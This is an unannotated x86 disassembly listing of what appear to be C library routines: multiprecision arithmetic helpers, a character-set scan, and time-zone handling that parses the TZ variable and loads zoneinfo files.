mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_10h]
mov edi, dword [arg_14h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808cbf0
je 0x808cbd9
xor eax, eax
cmp eax, edi
jge 0x808cb71
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808cb65
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808cb9f
mov edx, dword [arg_10h]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808cbc0
mov eax, 0
je 0x808cba7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808cb82
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_ch]
mov dword [var_ch], edi
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_8h], ecx
call fcn.0808c2a0
jmp 0x808cb94
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08090d80
jmp 0x808cb94
xor edx, edx
cmp edx, edi
jge 0x808cb71
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808cbe0
jmp 0x808cb71
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808cb73
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_ch]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808d130
je 0x808d119
xor eax, eax
cmp eax, edi
jge 0x808d0b1
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808d0a5
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808d0df
mov edx, dword [arg_ch]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808d100
mov eax, 0
je 0x808d0e7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808d0c2
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edi
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [esp], ebx
call fcn.0808c2a0
jmp 0x808d0d4
lea esi, [esi]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808d0d4
xor edx, edx
cmp edx, edi
jge 0x808d0b1
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808d120
jmp 0x808d0b1
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808d0b3
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_10h], 1
mov edi, dword [arg_ch]
je 0x808d1f1
mov esi, dword [arg_10h]
dec esi
cmp esi, 0x1f
jg 0x808d1d5
mov eax, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.0808d080
mov eax, dword [edi + esi*4]
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov eax, dword [edi + esi*4]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
call fcn.08090d80
mov ecx, dword [arg_10h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_14h]
mov ecx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [esp], ecx
call fcn.0808d150
jmp 0x808d182
mov esi, dword [arg_10h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d494
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
lea eax, [edi + esi*4]
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d080
lea ebx, [edi + esi*4]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d47d
mov eax, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], edi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.0808d570
cmp esi, 0x1f
jg 0x808d458
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808d080
test esi, esi
jle 0x808d28d
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
lea ebx, [edx + esi*4]
lea ecx, [edx + eax*4]
mov edx, esi
mov esi, esi
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808d280
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, esi
lea eax, [ecx + edx*4]
mov dword [var_10h], edx
mov dword [var_8h], eax
mov eax, dword [arg_10h]
shl eax, 2
mov dword [var_14h], eax
mov eax, ecx
add eax, dword [var_14h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov ebx, eax
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808d436
mov ecx, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.0808d080
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808d368
mov eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_18h], esi
lea ecx, [edx + eax*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808d410
mov eax, esi
dec eax
mov dword [var_18h], eax
je 0x808d368
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d410
dec dword [var_18h]
jne 0x808d350
xor edx, edx
cmp edx, esi
jge 0x808d381
mov esi, esi
mov ecx, dword [arg_14h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808d370
mov edx, dword [arg_14h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808d1cd
mov eax, dword [arg_10h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808d3e7
dec ebx
je 0x808d1cd
mov esi, esi
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d3e7
dec ebx
jne 0x808d3d0
jmp 0x808d1cd
cmp ecx, esi
je 0x808d1cd
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d1cd
lea esi, [esi]
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d400
jmp 0x808d1cd
cmp ecx, edi
je 0x808d368
mov ebx, dword [var_18h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d368
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d426
jmp 0x808d368
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
add eax, dword [var_14h]
mov dword [var_ch], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d2fd
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.0808d150
jmp 0x808d26c
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
jmp 0x808d248
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
mov ecx, dword [arg_8h]
mov dword [var_ch], eax
lea eax, [edi + esi*4]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d21b
mov edx, dword [arg_4h]
mov eax, dword [arg_8h]
xor ecx, ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push 0
push 0
push 0
push 0
push 0
push 0
mov cl, byte [eax]
test cl, cl
je 0x8090e9d
mov byte [esp + ecx], cl
mov cl, byte [eax + 1]
test cl, 0xff
je 0x8090e9d
mov byte [esp + ecx], cl
mov cl, byte [eax + 2]
test cl, 0xff
je 0x8090e9d
mov byte [esp + ecx], cl
mov cl, byte [eax + 3]
add eax, 4
mov byte [esp + ecx], cl
test cl, 0xff
jne 0x8090e70
lea eax, [edx - 4]
add eax, 4
mov cl, byte [eax]
cmp byte [esp + ecx], cl
je 0x8090ec5
mov cl, byte [eax + 1]
cmp byte [esp + ecx], cl
je 0x8090ec4
mov cl, byte [eax + 2]
cmp byte [esp + ecx], cl
je 0x8090ec3
mov cl, byte [eax + 3]
cmp byte [esp + ecx], cl
jne 0x8090ea0
inc eax
inc eax
inc eax
add esp, 0x100
or cl, cl
jne 0x8090ed2
xor eax, eax
ret
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov edx, dword [0x80aaa68]
test edx, edx
je 0x808df3b
test eax, eax
je 0x808e150
mov dword [0x80aaa68], 1
mov dword [esp], 0x80a7234
call fcn.080631c0
test eax, eax
mov dword [var_20h], eax
je 0x808e822
mov eax, dword [var_20h]
cmp byte [eax], 0
mov eax, str.Universal
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
mov edi, dword [var_20h]
test edi, edi
je 0x808df85
mov edx, dword [var_20h]
mov eax, dword [var_20h]
inc eax
cmp byte [edx], 0x3a
cmovne eax, edx
mov dword [var_20h], eax
mov ebx, dword [0x80aaae4]
test ebx, ebx
je 0x808dfb0
mov esi, dword [var_20h]
test esi, esi
je 0x808dfb0
mov eax, dword [var_20h]
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x808e150
lea esi, [esi]
test ebx, ebx
mov dword [0x80aaaa0], 0
mov dword [0x80aaac0], 0
jne 0x808e815
mov ebx, dword [var_20h]
xor eax, eax
test ebx, ebx
je 0x808dfe0
mov edx, dword [var_20h]
mov dword [esp], edx
call fcn.08076e80
mov dword [0x80aaae4], eax
mov dword [var_8h], 0
mov dword [var_4h], 0
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.0808ecc0
mov ecx, dword [0x80aad48]
test ecx, ecx
jne 0x808e150
mov edx, dword [var_20h]
test edx, edx
je 0x808e040
mov edx, dword [var_20h]
cmp byte [edx], 0
je 0x808e040
mov eax, str._etc_localtime
test eax, eax
je 0x808e158
mov ecx, 0xf
mov esi, edx
mov edi, eax
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x808e158
lea esi, [esi]
mov ecx, 0x80a7250
xor edx, edx
mov dword [0x80aaac0], 0x80a7250
mov dword [0x80aaaa0], ecx
mov dword [0x80aaac4], 0
mov dword [0x80aaaa4], 0
mov word [0x80aaaac], 0
mov word [0x80aaaaa], 0
mov word [0x80aaaa8], 0
mov word [0x80aaacc], 0
mov word [0x80aaaca], 0
mov word [0x80aaac8], 0
mov dword [0x80aaad0], 0
mov dword [0x80aaab0], 0
mov dword [0x80aaad4], 0
mov dword [0x80aaab4], 0
mov dword [0x80aaad8], 0xffffffff
mov dword [0x80aaab8], 0xffffffff
mov dword [0x80aaadc], 0
mov dword [0x80aaabc], 0
xor eax, eax
mov ebx, dword [0x80aaac0]
mov dword [0x80a9c28], ecx
cmp edx, dword [0x80aaad4]
mov dword [esp], ecx
setne al
neg edx
mov dword [0x80aaa64], edx
mov dword [0x80a9c2c], ebx
mov dword [0x80aaa60], eax
call fcn.08053400
mov dword [esp], ebx
mov esi, eax
call fcn.08053400
mov edx, dword [0x80aad44]
mov ecx, eax
cmp esi, edx
jbe 0x808e141
mov edx, esi
mov dword [0x80aad44], esi
mov eax, dword [0x80aad44]
cmp ecx, edx
cmova eax, ecx
mov dword [0x80aad44], eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
cld
xor eax, eax
mov edi, 0x80aaaa0
mov ecx, 0x10
rep stosd dword es:[edi], eax
mov eax, dword [var_20h]
mov dword [0x80aaac0], 0x80a4f11
mov dword [0x80aaaa0], 0x80a4f11
mov dword [esp], eax
call fcn.08053400
lea edx, [eax + 1]
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
mov dword [var_8h], edx
lea eax, [var_27h]
mov edx, dword [var_20h]
and eax, 0xfffffff0
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [var_4h], str.__0_9___
mov dword [var_8h], eax
mov esi, eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08049be0
dec eax
je 0x808e1d8
mov edx, dword [0x80aaab4]
mov ecx, dword [0x80aaaa0]
jmp 0x808e0f1
mov dword [esp], esi
call fcn.08053400
cmp eax, 2
mov ebx, eax
jbe 0x808e1c7
mov dword [esp], esi
call fcn.0808de40
add dword [var_20h], ebx
mov dword [0x80aaaa0], eax
mov ecx, eax
mov eax, dword [var_20h]
movzx edx, byte [eax]
test dl, dl
mov ebx, edx
je 0x808e80a
cmp dl, 0x2b
je 0x808e222
cmp dl, 0x2d
je 0x808e222
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e80a
cmp bl, 0x2d
je 0x808e7f0
cmp bl, 0x2b
je 0x808e7f0
mov dword [0x80aaab4], 0xffffffff
lea eax, [var_10h]
lea edx, [var_eh]
mov dword [var_4h], str._hu:_hu:_hu
mov dword [var_sp_ch], eax
mov dword [var_sp_10h], edx
mov eax, dword [var_20h]
lea edx, [var_12h]
mov dword [var_8h], edx
mov dword [esp], eax
call fcn.08049be0
cmp eax, 2
je 0x808e27e
jg 0x808e7e2
dec eax
jne 0x808e1c7
mov word [var_10h], 0
mov word [var_eh], 0
movzx eax, word [var_eh]
mov ecx, 0x3b
movzx edx, ax
cmp ax, 0x3a
mov eax, dword [var_10h]
cmovbe ecx, edx
lea edx, [ecx + 0xdd4]
cmp ax, 0x3a
ja 0x808e2b3
movzx edx, ax
mov eax, edx
shl eax, 4
sub eax, edx
lea edx, [ecx + eax*4]
movzx eax, word [var_12h]
cmp ax, 0x17
ja 0x808e7d7
movzx eax, ax
imul eax, eax, 0xe10
lea eax, [eax + edx]
mov edx, dword [0x80aaab4]
xor ebx, ebx
imul edx, eax
mov eax, dword [var_20h]
mov dword [0x80aaab4], edx
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e303
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
jbe 0x808e2ef
cmp ebx, 1
ja 0x808e311
cmp dl, 0x3a
je 0x808e7c9
inc ebx
cmp ebx, 2
jbe 0x808e2e4
test dl, dl
je 0x808e7ac
mov dword [esp], esi
call fcn.08053400
mov edx, dword [var_20h]
mov dword [var_4h], str.__0_9___
lea esi, [eax + esi + 1]
mov dword [var_8h], esi
mov dword [esp], edx
call fcn.08049be0
dec eax
je 0x808e5e6
mov eax, dword [var_20h]
movzx edx, byte [eax]
xor edi, edi
movzx eax, di
shl eax, 5
cmp dl, 0x2c
lea esi, [eax + 0x80aaaa0]
je 0x808e5d8
cmp dl, 0x4a
je 0x808e37a
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e502
xor eax, eax
cmp dl, 0x4a
sete al
mov dword [esi + 4], eax
dec eax
je 0x808e4e8
lea eax, [var_18h]
mov dword [var_sp_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov eax, dword [var_20h]
mov dword [esp], eax
call fcn.08063780
mov edx, dword [var_18h]
cmp edx, dword [var_20h]
mov word [esi + 0xc], ax
je 0x808e1c7
cmp ax, 0x16d
ja 0x808e1c7
cmp dword [esi + 4], 1
je 0x808e4da
mov dword [var_20h], edx
mov eax, dword [var_20h]
movzx edx, byte [eax]
test dl, dl
mov eax, edx
je 0x808e3ef
cmp dl, 0x2f
je 0x808e3ef
cmp dl, 0x2c
jne 0x808e1c7
cmp al, 0x2f
je 0x808e417
mov dword [esi + 0x10], 0x1c20
inc edi
mov dword [esi + 0x1c], 0xffffffff
cmp di, 1
ja 0x808e1c7
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e351
inc dword [var_20h]
mov edx, dword [var_20h]
cmp byte [edx], 0
je 0x808e1c7
lea edx, [var_10h]
lea eax, [var_eh]
mov dword [var_4h], str._hu:_hu:_hu
mov dword [var_sp_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [var_20h]
lea eax, [var_12h]
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08049be0
cmp eax, 2
je 0x808e464
jg 0x808e4d3
dec eax
je 0x808e45e
mov word [var_12h], 2
mov word [var_10h], 0
mov word [var_eh], 0
xor ebx, ebx
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e494
lea esi, [esi]
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
jbe 0x808e480
cmp ebx, 1
ja 0x808e4a7
mov eax, dword [var_20h]
inc eax
cmp dl, 0x3a
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
inc ebx
cmp ebx, 2
jbe 0x808e46c
movzx edx, word [var_10h]
movzx ecx, word [var_12h]
mov eax, edx
imul ecx, ecx, 0xe10
shl eax, 4
sub eax, edx
movzx edx, word [var_eh]
lea eax, [ecx + eax*4]
add eax, edx
mov dword [esi + 0x10], eax
jmp 0x808e3fa
cmp eax, 3
jne 0x808e458
jmp 0x808e46a
test ax, ax
jne 0x808e3d2
jmp 0x808e1c7
inc dword [var_20h]
mov edx, dword [var_20h]
movsx eax, byte [edx]
sub eax, 0x30
cmp eax, 9
jbe 0x808e38c
jmp 0x808e1c7
cmp dl, 0x4d
je 0x808e555
test dl, dl
jne 0x808e1c7
cmp esi, 0x80aaaa0
mov dword [esi + 4], 2
je 0x808e535
mov word [esi + 8], 0xa
mov word [esi + 0xa], 5
mov word [esi + 0xc], 0
jmp 0x808e3d5
mov word [0x80aaaa8], 4
mov word [0x80aaaaa], 1
mov word [0x80aaaac], 0
jmp 0x808e3d5
lea eax, [var_1ch]
mov dword [esi + 4], 2
mov edx, dword [var_20h]
mov dword [var_14h], eax
mov dword [var_4h], str.M_hu._hu._hu_n
lea eax, [esi + 0xc]
mov dword [var_sp_10h], eax
lea eax, [esi + 0xa]
mov dword [var_sp_ch], eax
mov dword [esp], edx
lea eax, [esi + 8]
mov dword [var_8h], eax
call fcn.08049be0
cmp eax, 3
jne 0x808e1c7
movzx eax, word [esi + 8]
test ax, ax
je 0x808e1c7
cmp ax, 0xc
ja 0x808e1c7
movzx eax, word [esi + 0xa]
test ax, ax
je 0x808e1c7
cmp ax, 5
ja 0x808e1c7
cmp word [esi + 0xc], 6
ja 0x808e1c7
mov eax, dword [var_1ch]
add dword [var_20h], eax
jmp 0x808e3d5
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e366
mov dword [esp], esi
call fcn.08053400
cmp eax, 2
mov ebx, eax
jbe 0x808e349
mov dword [esp], esi
call fcn.0808de40
add dword [var_20h], ebx
mov edx, dword [var_20h]
mov dword [0x80aaac0], eax
movzx eax, byte [edx]
cmp al, 0x2d
je 0x808e793
cmp al, 0x2b
je 0x808e793
mov dword [0x80aaad4], 0xffffffff
lea edx, [var_10h]
lea eax, [var_eh]
mov dword [var_4h], str._hu:_hu:_hu
mov dword [var_sp_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [var_20h]
lea eax, [var_12h]
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08049be0
cmp eax, 2
je 0x808e729
jg 0x808e788
dec eax
je 0x808e723
mov eax, dword [0x80aaab4]
add eax, 0xe10
mov dword [0x80aaad4], eax
xor ebx, ebx
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
ja 0x808e69d
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
movsx eax, dl
sub eax, 0x30
cmp eax, 9
jbe 0x808e689
cmp ebx, 1
ja 0x808e6a7
cmp dl, 0x3a
je 0x808e718
inc ebx
cmp ebx, 2
jbe 0x808e67e
test dl, dl
je 0x808e6c7
cmp dl, 0x2c
jne 0x808e34f
mov eax, dword [var_20h]
cmp byte [eax + 1], 0
jne 0x808e34f
mov eax, dword [0x80aaad4]
mov dword [var_sp_ch], eax
mov eax, dword [0x80aaab4]
mov dword [var_8h], eax
mov eax, dword [0x80aaac0]
mov dword [var_4h], eax
mov eax, dword [0x80aaaa0]
mov dword [esp], eax
call fcn.0808f510
mov eax, dword [0x80aad48]
test eax, eax
je 0x808e349
mov eax, dword [0x80aaae4]
mov dword [esp], eax
call fcn.08051180
mov dword [0x80aaae4], 0
jmp 0x808e150
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e6a7
mov word [var_10h], 0
mov word [var_eh], 0
movzx eax, word [var_eh]
mov ecx, 0x3b
movzx edx, ax
cmp ax, 0x3a
mov eax, dword [var_10h]
cmovbe ecx, edx
lea edx, [ecx + 0xdd4]
cmp ax, 0x3a
ja 0x808e75e
movzx edx, ax
mov eax, edx
shl eax, 4
sub eax, edx
lea edx, [ecx + eax*4]
movzx eax, word [var_12h]
cmp ax, 0x16
ja 0x808e780
movzx eax, ax
imul eax, eax, 0xe10
lea eax, [eax + edx]
imul eax, dword [0x80aaad4]
jmp 0x808e671
lea eax, [edx + 0x14370]
jmp 0x808e774
cmp eax, 3
jne 0x808e667
jmp 0x808e72f
inc dword [var_20h]
cmp al, 0x2d
sete al
movzx eax, al
lea eax, [eax + eax - 1]
mov dword [0x80aaad4], eax
jmp 0x808e629
mov ecx, dword [0x80aaaa0]
mov edx, dword [0x80aaab4]
mov dword [0x80aaac0], ecx
mov dword [0x80aaad4], edx
jmp 0x808e0f1
inc dword [var_20h]
mov eax, dword [var_20h]
movzx edx, byte [eax]
jmp 0x808e311
lea eax, [edx + 0x15180]
jmp 0x808e2cd
cmp eax, 3
jne 0x808e1c7
jmp 0x808e284
xor eax, eax
inc dword [var_20h]
cmp bl, 0x2d
sete al
lea edx, [eax + eax - 1]
mov dword [0x80aaab4], edx
jmp 0x808e23e
mov edx, dword [0x80aaab4]
jmp 0x808e0f1
mov dword [esp], ebx
call fcn.08051180
jmp 0x808dfcc
mov dword [var_20h], str._etc_localtime
jmp 0x808df6e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x68
mov eax, dword [0x80aad9c]
mov dword [0x80aad48], 0
test eax, eax
jne 0x808f4da
mov ebx, dword [arg_8h]
mov dword [0x80aad9c], 0
test ebx, ebx
je 0x808f4c7
mov edx, dword [var_4h]
movzx eax, byte [edx]
test al, al
je 0x808ed28
mov ecx, dword [0x80a95f4]
test ecx, ecx
je 0x808ed36
cmp al, 0x2f
je 0x808f494
mov eax, dword [var_4h]
mov dword [var_4h], 0x80a728e
mov dword [esp], eax
call fcn.080535c0
test eax, eax
je 0x808ed30
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_4h]
movzx eax, byte [edx]
cmp al, 0x2f
je 0x808edb5
mov dword [esp], str.TZDIR
call fcn.080631c0
test eax, eax
mov dword [var_54h], eax
je 0x808ed56
cmp byte [eax], 0
jne 0x808f481
mov dword [var_54h], str._usr_share_zoneinfo
mov dword [var_58h], 0x13
mov ebx, dword [var_4h]
mov dword [esp], ebx
call fcn.08053400
mov edi, dword [var_58h]
mov esi, dword [var_58h]
mov ebx, eax
inc ebx
lea eax, [ebx + esi + 0x13]
and eax, 0xfffffffc
sub esp, eax
mov eax, dword [var_54h]
lea esi, [var_1fh]
mov dword [var_8h], edi
and esi, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08053740
mov byte [eax], 0x2f
mov edx, dword [var_4h]
mov dword [var_8h], ebx
inc eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [var_4h], esi
mov ecx, dword [var_4h]
mov dword [var_4h], 0x8093820
mov dword [esp], ecx
call fcn.0804a250
test eax, eax
mov edi, eax
je 0x808ed28
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
lea eax, [var_3ch]
mov dword [var_sp_ch], edi
mov dword [var_8h], 1
mov dword [var_4h], 0x2c
mov dword [esp], eax
call fcn.08090dc0
dec eax
jne 0x808f400
mov ebx, dword [var_14h]
mov esi, dword [var_24h]
ror bx, 8
ror ebx, 0x10
ror bx, 8
ror si, 8
ror esi, 0x10
ror si, 8
mov dword [var_5ch], ebx
mov eax, dword [var_1ch]
mov dword [var_60h], esi
ror ax, 8
ror eax, 0x10
ror ax, 8
mov ecx, dword [var_18h]
mov esi, dword [var_5ch]
mov dword [0x80aaae8], eax
ror cx, 8
ror ecx, 0x10
ror cx, 8
lea eax, [eax + eax*4 + 3]
mov dword [0x80aaaf0], ecx
mov edx, dword [var_20h]
and eax, 0xfffffffc
ror dx, 8
ror edx, 0x10
ror dx, 8
mov ebx, dword [var_28h]
mov dword [var_4ch], eax
mov dword [0x80aab04], edx
ror bx, 8
ror ebx, 0x10
ror bx, 8
lea eax, [esi + ecx*8]
mov dword [var_64h], ebx
mov ecx, dword [var_4ch]
lea eax, [eax + ecx + 3]
and eax, 0xfffffffc
mov dword [var_50h], eax
lea eax, [eax + edx*8]
add eax, dword [arg_ch]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ecx, eax
mov dword [0x80aad9c], eax
je 0x808f400
mov esi, dword [0x80aaae8]
lea ebx, [esi*4]
lea edx, [ebx + eax]
mov eax, dword [var_4ch]
mov dword [0x80aaaec], edx
lea edx, [eax + ecx]
mov eax, dword [0x80aaaf0]
mov dword [0x80aaaf4], edx
lea eax, [edx + eax*8]
mov edx, dword [var_50h]
mov dword [0x80aaaf8], eax
lea eax, [edx + ecx]
mov edx, dword [arg_ch]
mov dword [0x80aab08], eax
test edx, edx
je 0x808eeff
mov edx, dword [0x80aab04]
lea edx, [eax + edx*8]
mov eax, dword [var_sp_ch]
mov dword [eax], edx
add ebx, esi
mov dword [var_sp_ch], edi
mov eax, dword [0x80aad9c]
mov dword [var_8h], ebx
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.08090dc0
cmp eax, ebx
jne 0x808f400
mov dword [var_48h], 0
mov ebx, dword [0x80aaae8]
cmp dword [var_48h], ebx
jae 0x808f476
mov ecx, dword [0x80aaaf0]
mov edx, dword [0x80aaaec]
mov esi, dword [var_48h_2]
movzx eax, byte [esi + edx]
cmp eax, ecx
jae 0x808f400
inc esi
cmp esi, ebx
mov dword [var_48h_2], esi
jb 0x808ef48
lea eax, [ebx - 1]
test ebx, ebx
mov dword [var_48h], eax
je 0x808ef90
mov edx, eax
shl edx, 2
add edx, dword [0x80aad9c]
mov eax, dword [edx]
ror ax, 8
ror eax, 0x10
ror ax, 8
mov dword [edx], eax
mov eax, dword [var_48h_2]
sub edx, 4
dec dword [var_48h_2]
test eax, eax
jne 0x808ef74
mov dword [var_48h], 0
cmp dword [var_48h], ecx
jae 0x808f045
lea esi, [var_40h]
mov ebx, 4
mov eax, dword [edi + 4]
cmp eax, dword [edi + 8]
jae 0x808f467
movzx edx, byte [eax]
inc eax
mov dword [edi + 4], eax
cmp edx, 0xffffffff
je 0x808efc6
mov byte [esi], dl
inc esi
dec ebx
jne 0x808efa8
test ebx, ebx
jne 0x808f400
mov eax, dword [edi + 4]
